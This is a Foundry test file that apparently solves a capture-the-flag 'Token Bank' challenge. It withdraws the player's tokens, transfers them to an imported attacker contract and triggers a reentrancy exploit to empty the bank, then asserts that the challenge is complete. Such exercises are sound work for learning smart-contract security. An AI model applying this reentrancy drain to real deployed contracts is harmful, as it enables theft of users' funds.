// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import { TokenBankChallenge, SimpleERC223Token, TokenBankAttacker } from "../src/TokenBank.sol";

contract TankBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;
    SimpleERC223Token public simpleToken;
    address player = address(1234);

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        simpleToken = SimpleERC223Token(tokenBankChallenge.token());
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));

        // Put your solution here
        vm.startPrank(player);
        // withdraw players money
        tokenBankChallenge.withdraw(500000 ether);
        // send to exploit contract
        simpleToken.approve(address(player), 500000 ether);
        simpleToken.transferFrom(player, address(tokenBankAttacker), 500000 ether);
        // fire reentrency exploit
        tokenBankAttacker.reenter();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }
}
